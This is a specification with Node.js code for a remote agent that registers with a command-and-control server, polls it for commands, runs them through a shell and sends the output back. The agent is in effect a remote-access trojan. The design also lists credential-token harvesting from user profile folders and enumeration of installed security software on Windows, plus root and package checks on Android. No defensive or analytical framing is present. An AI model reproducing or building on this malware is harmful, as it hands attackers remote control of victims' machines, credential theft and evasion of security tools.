# Agent Script Specification (Node.js Reference)

This document describes the reference implementation for the remote agent script.

## Core Dependencies
- `node-fetch`: For API communication.
- `child_process`: For executing shell commands.
- `os`: For gathering system metadata.
- `crypto`: For generating a unique hardware-based UUID.

## Agent Lifecycle

### 1. Initialization
The agent generates a unique ID based on the machine's hardware profile or a stored local file. It gathers hostname and OS platform information.

### 2. Handshake (Registration)
The agent registers itself with the C2 server using the `/api/agents/register` endpoint.

```javascript
const register = async () => {
  const payload = {
    id: AGENT_ID,
    hostname: os.hostname(),
    os: os.platform() === 'win32' ? 'windows' : 'android',
    metadata: {
      arch: os.arch(),
      cpus: os.cpus().length,
      memory: os.totalmem()
    }
  };
  await fetch(`${C2_URL}/api/agents/register`, {
    method: 'POST',
    body: JSON.stringify(payload)
  });
};
```

### 3. Command Polling Loop
The agent polls for pending commands every 5 seconds.

```javascript
const pollCommands = async () => {
  const res = await fetch(`${C2_URL}/api/agents/${AGENT_ID}/commands`);
  const commands = await res.json();
  for (const cmd of commands) {
    executeCommand(cmd);
  }
};
```

### 4. Execution & Reporting
Commands are executed using `exec`. The output (stdout/stderr) is captured and sent back to the server.

```javascript
const executeCommand = (cmd) => {
  exec(cmd.command, async (error, stdout, stderr) => {
    const result = {
      status: error ? 'failed' : 'completed',
      output: stdout || stderr || error.message
    };
    await fetch(`${C2_URL}/api/commands/${cmd.id}/result`, {
      method: 'POST',
      body: JSON.stringify(result)
    });
  });
};
```

## OS-Specific Automations

### Windows (PowerShell/CMD)
- **Token Extraction:** Searching user profile directories for configuration files (e.g., `.config/` or `AppData/Local/`).
- **Process Enumeration:** Using `tasklist` to identify security software or specific targets.

### Android (Termux/ADB)
- **Environment Detection:** Checking for root access or specific package presence via `pm list packages`.
- **UI Interconnectivity:** (Theoretical via `uiautomator`) detecting screen structure to suggest interaction points.
